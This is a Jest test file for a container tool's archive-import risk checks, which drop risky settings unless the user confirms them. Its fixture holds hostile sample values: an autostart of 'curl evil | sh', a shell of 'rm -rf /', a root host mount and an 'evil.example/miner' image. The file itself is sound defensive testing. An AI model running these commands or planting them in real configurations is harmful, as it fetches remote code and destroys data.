'use strict';

const { summarizeRisks, buildImportCreateOptions } = require('../lib/archive/risks');

describe('lib/archive/risks', () => {
    const snapshot = {
        hostPath: '/old', containerPath: '/workspace', imageName: 'ghcr.io/xcanwin/manyoyo', imageVersion: '1.0.0-common', containerMode: 'sock',
        volumes: ['/:/host', '/exists:/data', '/missing:/m'], ports: ['8080:80'], autostart: 'curl evil | sh',
        env: { A: '1' }, envFile: ['/exists', '/missing', 'relative'], first: { shell: 'rm -rf /' },
        network: { preset: 'custom', outbound: [{ action: 'allow', target: '@any', ports: '', proto: 'all', enabled: true }], inbound: [] }
    };
    const exists = p => p === '/exists';

    test('摘要列出所有高风险设置', () => {
        expect(summarizeRisks(snapshot)).toEqual({ containerMode: 'sock', volumes: ['/:/host', '/exists:/data', '/missing:/m'], ports: ['8080:80'], autostart: true, envFiles: ['/exists', '/missing', 'relative'], networkOpen: true });
        expect(summarizeRisks({ containerMode: 'common', network: { preset: 'restricted' } }, '  ')).toEqual({ containerMode: '', volumes: [], ports: [], autostart: false, envFiles: [], networkOpen: false });
        // 任何自定义策略都要确认（可能放行内网 / 元数据地址），不只是“允许任何地址”
        expect(summarizeRisks({ network: { preset: 'custom', outbound: [{ action: 'allow', target: '10.0.0.0/8', ports: '', proto: 'all', enabled: true }], inbound: [] } }).networkOpen).toBe(true);
    });

    test('一项都没确认：sock、挂载、端口、自启动、不限制网络全部去掉，first 永远不带', () => {
        const { createOptions, dropped } = buildImportCreateOptions(snapshot, {}, { hostPath: '/new', pathExists: exists });
        expect(createOptions).toMatchObject({ hostPath: '/new', containerPath: '/workspace', volumes: [], ports: [], autostart: '', envFile: [] });
        expect(createOptions.containerMode).toBeUndefined();
        expect(createOptions.network).toBeUndefined();
        expect(createOptions).not.toHaveProperty('first');
        expect(dropped.length).toBeGreaterThanOrEqual(5);
    });

    test('逐项确认后才带上；挂载还要宿主机路径在本机存在；容器模式必须确认的就是它自己', () => {
        const confirm = { containerMode: 'sock', volumes: ['/exists:/data', '/missing:/m'], ports: true, autostart: true, envFiles: ['/exists', '/missing'], networkOpen: true };
        const { createOptions } = buildImportCreateOptions(snapshot, confirm, { hostPath: '/new', pathExists: exists });
        expect(createOptions).toMatchObject({ containerMode: 'sock', volumes: ['/exists:/data'], ports: ['8080:80'], autostart: 'curl evil | sh' });
        expect(createOptions.network).toBeTruthy();
        expect(createOptions.confirmRisk).toBe(true);
        expect(createOptions.envFile).toEqual(['/exists']);
        expect(buildImportCreateOptions(snapshot, { containerMode: 'dind' }, { hostPath: '/new' }).createOptions.containerMode).toBeUndefined();
    });

    test('镜像名不是 manyoyo 的镜像：即使选“与原来相同”也不带，改用本机默认镜像（归档不能指定任意镜像）', () => {
        const evil = { ...snapshot, imageName: 'evil.example/miner', imageVersion: '1' };
        const { createOptions, dropped } = buildImportCreateOptions(evil, {}, { hostPath: '/n', imageMode: 'same' });
        expect(createOptions).not.toHaveProperty('imageName');
        expect(dropped.join()).toContain('不是 manyoyo 的镜像');
        expect(buildImportCreateOptions(evil, {}, { hostPath: '/n', imageMode: 'same', trustedImages: ['evil.example/miner'] }).createOptions.imageName).toBe('evil.example/miner');
        expect(buildImportCreateOptions({ ...snapshot, imageName: 'localhost/xcanwin/manyoyo' }, {}, { hostPath: '/n' }).createOptions.imageName).toBe('localhost/xcanwin/manyoyo');
    });

    test('未确认的自定义网络不带；受限 / 白名单策略不会被打上“已确认”（仍要过创建时的宽规则检查）', () => {
        const allow = { ...snapshot, network: { preset: 'allowlist', outbound: [], inbound: [] } };
        const { createOptions } = buildImportCreateOptions(allow, {}, { hostPath: '/n' });
        expect(createOptions.network).toBeTruthy();
        expect(createOptions).not.toHaveProperty('confirmRisk');
    });

    test('“用本机默认版本”不带镜像名和版本', () => {
        expect(buildImportCreateOptions(snapshot, {}, { hostPath: '/n', imageMode: 'default' }).createOptions).not.toHaveProperty('imageName');
        expect(buildImportCreateOptions(snapshot, {}, { hostPath: '/n', imageMode: 'same' }).createOptions.imageName).toBe('ghcr.io/xcanwin/manyoyo');
    });
});
